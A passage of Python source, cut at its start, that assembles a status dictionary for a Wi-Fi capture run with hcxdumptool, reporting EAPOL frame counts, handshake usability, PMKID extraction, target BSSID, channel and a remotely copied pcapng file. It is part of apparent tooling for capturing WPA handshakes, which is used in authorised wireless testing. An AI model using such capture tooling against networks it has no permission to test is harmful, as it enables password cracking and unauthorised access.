            else f'{eapol_count} EAPOL frame(s) captured - need >= 2 for a usable handshake' if eapol_count == 1
            else 'no EAPOL frames seen, but a PMKID may still be present - extraction will be attempted automatically' if outcome == 'no_eapol_pmkid_extraction_required'
            else 'capture file is empty - hcxdumptool produced no frames'
        ),
        'outcome': outcome,
        'extraction_required': not handshake_ok and outcome != 'empty_capture',
        'bssid_filter_applied': bssid_filter_applied,
        'used_mon_interface': used_mon_interface,
        'pcap_path': local_pcapng,
        'local_pcap': local_pcapng,
        'remote_pcapng': remote_pcapng,
        'bssid': bssid,
        'channel': channel,
        'interface': interface,
        'size_bytes': size_bytes,
        'eapol_count': eapol_count,
        'capture_seconds': capture_seconds,
        'run_result': run_result,
        'scp_result': scp_result,
        'capture_method': 'hcxdumptool',
    }
